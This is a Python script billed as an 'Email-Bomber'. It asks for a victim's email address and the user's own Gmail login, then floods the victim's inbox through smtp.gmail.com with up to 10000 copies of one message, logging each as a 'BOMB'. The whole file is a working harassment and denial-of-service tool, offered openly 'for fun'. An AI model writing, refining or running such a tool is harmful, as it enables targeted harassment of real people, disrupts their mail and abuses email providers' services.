import smtplib
import sys
import os

class bcolors:
    GREEN='\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[34m'
    Syellow='\33[105m'
    MAGENTA = '\033[35m'
    UNDERLINE = '\033[4m'




def banner():
    print(bcolors.MAGENTA+ '            +++##########[_Email-Bomber_]##########---')
    print(bcolors.MAGENTA+ '            +++########[Lets_do_it_for_fun]########---]')
    print(bcolors.RED+  '''
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| 
||----------------------[__) _ ._ _ |_  _ ._.,-------------------||
||____________________|_[__)(_)[ | )[_)(/,[__ ___________________||             
||                   \|/                                         ||
||                    |                                          ||
||                    "                                          ||
||                     "                                         ||
||                       "--+--"                                 ||   ''')
    print(bcolors.YELLOW+'''||                          |                                    ||
||                      ,--'#`--.                                ||
||                      |#######|                                ||
||                   _.-'#######`-._                             ||
||                 ,-'###############`-.                         ||
||               ,'#####################`,                       ||
||              |#########################|                      ||
||             |###########################|                     ||
||            |#############################|                    || 
||            |#############################|                    ||
||            |#############################|                    ||
||             |###########################|                     ||
||              \#########################/                      ||
||               `,######################,'                      ||
||                `._################_,'                         ||
||                   `--..#######..--'                           ||
|||_____________________________________________________________|||
|||_____________________________________________________________|||      ''')

    print(bcolors.BLUE + '''||                         ,.___     .__         .               ||
||                        |[__ ._ _ [__) _ ._ _ |_  _ ._.        ||
||                        |[___[ | )[__)(_)[ | )[_)(/,[          ||
||                                                               ||
||                                                               ||
|||_____________________________________________________________|||  ''')
    print(bcolors.RED+'''||                                     __________________________||      
||                                     ||Author:@_Specter_Dhanush||
||                                     --------------------------||
|| _____________________________________________________________|||                                         
|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||      ''')



class Email_Bomber:
    count=0

    def inpu(self):

      try:
        ame =input(bcolors.YELLOW+"<<## Enter your name ##<<: ")
        self.name=ame.upper()
        print(bcolors.YELLOW+'...###+[Resourcing the program]-###...')
        self.target=str(input(bcolors.YELLOW+self.name+" can you enter the (victim email) <<: "))
      except Exception as e:
        print(f'ERROR: {e}')

    def attack1(self):
        try:
            self.attacker = str(input(bcolors.RED + self.name + " can you enter your email id <<: "))
            self.attackerps = str(
                input(bcolors.RED + self.name + ' can you enter the password for ' + self.attacker + " <<: "))

        except Exception as e:
            print(f'ERROR: {e}')

    def inpue(self):
      try:
        self.num=int(input(bcolors.BLUE+self.name+ " can you select the amount of messages from (1-10000)<<: "))
        if self.num not in range(10000):
            print(" invalid input :"+self.num)
        self.message = str(input(bcolors.BLUE+self.name + ' can you enter  message <<: '))
      except Exception as e:
        print(f'ERROR: {e}')



    def email(self):

        try:
            self.port = int(587)
            self.server = 'smtp.gmail.com'
            self.fromAddr = self.attacker
            self.fromPwd = self.attackerps
            self.subject = str(input(bcolors.RED + '<<## Enter subject ##<<: '))


            self.message =self.message

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target,self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
      try:
        print(bcolors.BLUE + '\n+++[## Attacking ##]... ___')
        for email in range(self.num + 1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+++[## Attack finished ##]___')
        sys.exit(0)
      except Exception as e:
            print(f'ERROR: {e}')


def funbomb():
    banner()
    bomb1 =Email_Bomber()
    bomb1.inpu()
    bomb1.attack1()
    bomb1.inpue()
    bomb1.email()
    bomb1.attack()

funbomb()









